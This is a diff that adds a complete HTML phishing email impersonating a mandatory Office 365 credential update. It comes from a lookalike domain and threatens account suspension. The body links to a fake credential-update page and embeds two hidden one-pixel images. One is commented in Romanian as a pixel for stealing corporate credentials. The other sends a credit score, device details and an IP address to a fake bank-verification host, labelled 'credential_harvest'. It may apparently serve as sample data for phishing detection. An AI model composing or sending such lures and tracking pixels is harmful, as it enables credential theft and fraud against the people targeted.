@@ -1,0 +1,21 @@
+Subject: IT Security Update Required
+From: it-security@microsoft-account-security.login-verify.ga
+To: admin@company.com
+Content-Type: text/html; charset=utf-8
+
+<html>
+<head><title>Corporate Security Update</title></head>
+<body>
+    <h2>Mandatory Security Update</h2>
+    <p>All employees must update their Office 365 credentials by end of day.</p>
+    
+    <!-- Pixel pentru furt credențiale corporative -->
+    <img src="https://microsoft-account-security.login-verify.ga/check.png?target=office365&user=admin" width="1" height="1" style="border:0;">
+    
+    <!-- Pixel cu date personale -->
+    <img src="https://secure-bank-verify.com/track.gif?campaign_id=phishing_2025&credit_score=750&device_info=Windows%2010%2C%20Chrome%20118&source=credential_harvest&ip_address=192.168.1.100" width="1" height="1" alt="">
+    
+    <p>Failure to comply will result in account suspension.</p>
+    <a href="https://microsoft-account-security.login-verify.ga/update">Update Credentials</a>
+</body>
+</html>
